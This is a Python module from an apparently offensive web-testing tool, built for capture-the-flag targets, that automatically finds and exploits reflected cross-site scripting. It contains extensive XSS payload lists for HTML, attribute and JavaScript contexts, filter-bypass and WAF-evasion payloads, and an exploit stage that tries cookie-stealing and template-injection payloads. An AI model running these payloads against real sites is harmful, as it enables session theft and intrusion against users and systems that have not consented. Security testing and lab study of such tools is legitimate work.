"""
EnoughOfWeb — Cross-Site Scripting (XSS) Module
Reflected XSS detection via unique marker injection.
Context-aware payloads: HTML body, attribute, JavaScript.
"""

import re
import uuid
from typing import List, Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

from modules.base import BaseExploit, Finding, ExploitResult, Severity


# ---------------------------------------------------------------------------
# Context-aware payloads
# ---------------------------------------------------------------------------

# Unique marker prefix — each test generates a unique ID to track reflection
MARKER_PREFIX = "eowXSS"

# HTML body context payloads
HTML_BODY_PAYLOADS = [
    "<script>alert('{marker}')</script>",
    "<img src=x onerror=alert('{marker}')>",
    "<svg onload=alert('{marker}')>",
    "<svg/onload=alert('{marker}')>",
    "<body onload=alert('{marker}')>",
    "<details open ontoggle=alert('{marker}')>",
    "<marquee onstart=alert('{marker}')>",
    "<video><source onerror=alert('{marker}')>",
    "<audio src=x onerror=alert('{marker}')>",
    "<input onfocus=alert('{marker}') autofocus>",
    "<select autofocus onfocus=alert('{marker}')>",
    "<textarea autofocus onfocus=alert('{marker}')>",
    "<iframe src='javascript:alert(\"{marker}\")'>",
    "<math><mtext><table><mglyph><svg><mtext><textarea><path id=x /><animate attributeName=id begin=x.end to=x dur=0.001s fill=freeze /><animate attributeName=id values='alert({marker})' begin=x.end dur=0.001s fill=freeze />",
    "<div style='animation-name:x' onanimationstart=alert('{marker}')>",
]

# Attribute context payloads (break out of attribute value)
ATTRIBUTE_PAYLOADS = [
    "\" onmouseover=\"alert('{marker}')\" x=\"",
    "' onmouseover='alert(\"{marker}\")' x='",
    "\" onfocus=\"alert('{marker}')\" autofocus x=\"",
    "' onfocus='alert(\"{marker}\")' autofocus x='",
    "\"><script>alert('{marker}')</script><\"",
    "'><script>alert('{marker}')</script><'",
    "\"><img src=x onerror=alert('{marker}')><\"",
    "\" onclick=\"alert('{marker}')\"",
    "' onclick='alert(\"{marker}\")'",
    "\" style=\"animation-name:x\" onanimationstart=\"alert('{marker}')\"",
]

# JavaScript context payloads (break out of JS string)
JS_CONTEXT_PAYLOADS = [
    "';alert('{marker}');//",
    "\";alert('{marker}');//",
    "</script><script>alert('{marker}')</script>",
    "'-alert('{marker}')-'",
    "\"-alert('{marker}')-\"",
    "\\';alert('{marker}');//",
    "\\\";alert('{marker}');//",
    "{{{{alert('{marker}')}}}}",
    "${{alert('{marker}')}}",
]

# Filter bypass payloads
BYPASS_PAYLOADS = [
    "<ScRiPt>alert('{marker}')</ScRiPt>",
    "<scr<script>ipt>alert('{marker}')</scr</script>ipt>",
    "<img src=x oNeRrOr=alert('{marker}')>",
    "<svg/onload=alert('{marker}')>",
    "<img src=x onerror='alert(\"{marker}\")'>",
    "<<script>alert('{marker}')//<</script>",
    "<img src=\"x`\" `<script>alert('{marker}')</script>`>",
    "%3Cscript%3Ealert('{marker}')%3C/script%3E",
    "&lt;script&gt;alert('{marker}')&lt;/script&gt;",
    "javascript:alert('{marker}')",
    "jaVasCript:alert('{marker}')",
    "&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert('{marker}')",
    "<svg><script>alert&#40;'{marker}'&#41;</script>",
    "\"><svg onload=alert('{marker}')>",
    "<img src=x onerror=alert`{marker}`>",
    "<svg onload=alert&#x28;'{marker}'&#x29;>",
]

# DOM-based payloads (for reflected in URL)
DOM_PAYLOADS = [
    "#<img src=x onerror=alert('{marker}')>",
    "#\"><img src=x onerror=alert('{marker}')>",
]


class XSSExploit(BaseExploit):
    name = "xss"
    description = "Cross-Site Scripting — reflected, context-aware, filter bypass"
    priority = 5

    def detect(self, target_url: str, recon_data: dict) -> List[Finding]:
        findings: List[Finding] = []
        injection_points = self._gather_injection_points(target_url, recon_data)

        for point in injection_points:
            url = point["url"]
            param = point["param"]
            method = point["method"]
            base_data = point.get("base_data", {})

            finding = self._detect_xss(url, param, method, base_data)
            if finding:
                findings.append(finding)

        return findings

    def exploit(self, finding: Finding) -> ExploitResult:
        try:
            return self._exploit_xss(finding)
        except Exception as e:
            return ExploitResult(success=False, error=str(e))

    # ------------------------------------------------------------------
    # Internal
    # ------------------------------------------------------------------

    def _gather_injection_points(self, target_url, recon_data):
        points = []
        seen = set()

        for p in recon_data.get("parameters", []):
            key = (p.get("url", target_url), p["name"])
            if key in seen:
                continue
            seen.add(key)
            method = "GET" if p.get("location", "url") == "url" else "POST"
            points.append({
                "url": p.get("url", target_url),
                "param": p["name"],
                "method": method,
                "base_data": {},
            })

        for form in recon_data.get("forms", []):
            form_url = urljoin(target_url, form.get("action", ""))
            method = form.get("method", "POST").upper()
            inputs = form.get("inputs", {})
            for input_name in inputs:
                key = (form_url, input_name)
                if key in seen:
                    continue
                seen.add(key)
                points.append({
                    "url": form_url,
                    "param": input_name,
                    "method": method,
                    "base_data": dict(inputs),
                })

        if not points:
            for p in ["q", "search", "query", "name", "input", "text",
                       "msg", "message", "comment", "title", "content",
                       "value", "redirect", "url", "callback"]:
                points.append({"url": target_url, "param": p, "method": "GET", "base_data": {}})

        return points

    def _send_payload(self, url, param, method, payload, base_data=None):
        data = dict(base_data) if base_data else {}
        
        def _do_send(p: str):
            try:
                if method == "GET":
                    parsed = urlparse(url)
                    qs = parse_qs(parsed.query, keep_blank_values=True)
                    qs[param] = [p]
                    new_query = urlencode(qs, doseq=True)
                    test_url = urlunparse(parsed._replace(query=new_query))
                    return self._request("GET", test_url)
                else:
                    req_data = dict(data)
                    req_data[param] = p
                    return self._request("POST", url, data=req_data)
            except Exception:
                return None

        resp, used_payload, was_mutated = self._send_with_waf_retry(
            send_fn=_do_send,
            payload=payload,
            context="xss",
            target_url=url
        )
        return resp

    def _detect_xss(self, url, param, method, base_data) -> Optional[Finding]:
        # Step 1: Check if input is reflected at all
        marker = f"{MARKER_PREFIX}{uuid.uuid4().hex[:8]}"
        resp = self._send_payload(url, param, method, marker, base_data)
        if resp is None or marker not in resp.text:
            return None  # Input not reflected

        # Step 2: Determine context
        context = self._determine_context(resp.text, marker)

        # Step 3: Try payloads based on context
        payload_groups = self._get_payloads_for_context(context)

        for payload_template in payload_groups:
            test_marker = f"{MARKER_PREFIX}{uuid.uuid4().hex[:8]}"
            payload = payload_template.format(marker=test_marker)
            resp = self._send_payload(url, param, method, payload, base_data)
            if resp is None:
                continue

            # Check if the XSS payload is in the response unescaped
            if self._is_payload_reflected(resp.text, payload, test_marker):
                return Finding(
                    module=self.name,
                    vuln_type=f"xss-reflected-{context}",
                    target_url=url,
                    parameter=param,
                    method=method,
                    payload=payload,
                    evidence=f"XSS payload reflected in {context} context",
                    severity=Severity.MEDIUM,
                    extra={
                        "context": context,
                        "base_data": base_data,
                        "marker": test_marker,
                    },
                )

        return None

    def _determine_context(self, html: str, marker: str) -> str:
        """Determine the HTML context where the marker is reflected."""
        idx = html.find(marker)
        if idx == -1:
            return "body"

        # Get surrounding context
        before = html[max(0, idx - 200):idx]
        after = html[idx:idx + 200]

        # Check if inside a <script> tag
        script_open = before.rfind("<script")
        script_close = before.rfind("</script>")
        if script_open > script_close:
            return "javascript"

        # Check if inside an attribute value
        # Look for patterns like: attr="...MARKER or attr='...MARKER
        attr_double = before.rfind('"')
        attr_single = before.rfind("'")
        tag_open = before.rfind("<")
        tag_close = before.rfind(">")

        if tag_open > tag_close:
            # We're inside a tag
            if attr_double > tag_open and (attr_double > attr_single or attr_single < tag_open):
                return "attribute-double"
            if attr_single > tag_open and (attr_single > attr_double or attr_double < tag_open):
                return "attribute-single"
            return "attribute"

        # Check if inside a comment
        comment_open = before.rfind("<!--")
        comment_close = before.rfind("-->")
        if comment_open > comment_close:
            return "comment"

        return "body"

    def _get_payloads_for_context(self, context: str) -> list:
        """Get ordered payload list based on context."""
        if context == "javascript":
            return JS_CONTEXT_PAYLOADS + HTML_BODY_PAYLOADS + BYPASS_PAYLOADS
        elif context.startswith("attribute"):
            return ATTRIBUTE_PAYLOADS + HTML_BODY_PAYLOADS + BYPASS_PAYLOADS
        else:
            return HTML_BODY_PAYLOADS + ATTRIBUTE_PAYLOADS + BYPASS_PAYLOADS

    def _is_payload_reflected(self, html: str, payload: str, marker: str) -> bool:
        """Check if the XSS payload is reflected in a way that could execute."""
        # Check for direct reflection of key parts
        dangerous_patterns = [
            f"<script>alert('{marker}')</script>",
            f"<img src=x onerror=alert('{marker}')>",
            f"<svg onload=alert('{marker}')>",
            f"<svg/onload=alert('{marker}')>",
            f"onerror=alert('{marker}')",
            f"onload=alert('{marker}')",
            f"onfocus=alert('{marker}')",
            f"onclick=alert('{marker}')",
            f"onmouseover=alert('{marker}')",
            f"alert('{marker}')",
            f"alert(\"{marker}\")",
            f"alert`{marker}`",
        ]

        html_lower = html.lower()
        for pattern in dangerous_patterns:
            if pattern.lower() in html_lower:
                return True

        # Check if script/event handler tags are present unescaped
        if f"<script>" in html.lower() and marker in html:
            return True
        if re.search(r'on\w+\s*=', html, re.IGNORECASE) and marker in html:
            return True

        return False

    def _exploit_xss(self, finding: Finding) -> ExploitResult:
        """
        For XSS in a CTF context, we look for flags that might be exposed
        through the XSS (e.g., in cookies, hidden elements, or the response).
        """
        url = finding.target_url
        param = finding.parameter
        method = finding.method
        base_data = finding.extra.get("base_data", {})
        context = finding.extra.get("context", "body")

        # In CTF context, the flag might be in the response already
        # or might require specific payloads to extract

        # Try payloads that might expose server-side data
        exploit_payloads = [
            "<script>document.write(document.cookie)</script>",
            "<img src=x onerror=this.src='http://localhost/?c='+document.cookie>",
            "{{config}}",
            "{{self.__dict__}}",
            "<script>fetch('/flag').then(r=>r.text()).then(t=>document.title=t)</script>",
        ]

        all_data = []
        for payload in exploit_payloads:
            resp = self._send_payload(url, param, method, payload, base_data)
            if resp is None:
                continue
            flag = self._check_flag(resp.text)
            if flag:
                return ExploitResult(
                    success=True, flag=flag, payload_used=payload,
                    technique=f"xss-{context}", raw_response=resp.text[:2000],
                )

        # The original finding payload itself might have exposed a flag
        resp = self._send_payload(url, param, method, finding.payload, base_data)
        if resp:
            flag = self._check_flag(resp.text)
            if flag:
                return ExploitResult(
                    success=True, flag=flag, payload_used=finding.payload,
                    technique=f"xss-{context}",
                )
            all_data.append(f"Confirmed reflected XSS: {finding.payload}")

        # Report the XSS as exploitable even without a flag
        return ExploitResult(
            success=True,
            payload_used=finding.payload,
            technique=f"xss-reflected-{context}",
            data_extracted=f"Reflected XSS confirmed in parameter '{param}' ({context} context). "
                          f"Working payload: {finding.payload}",
        )
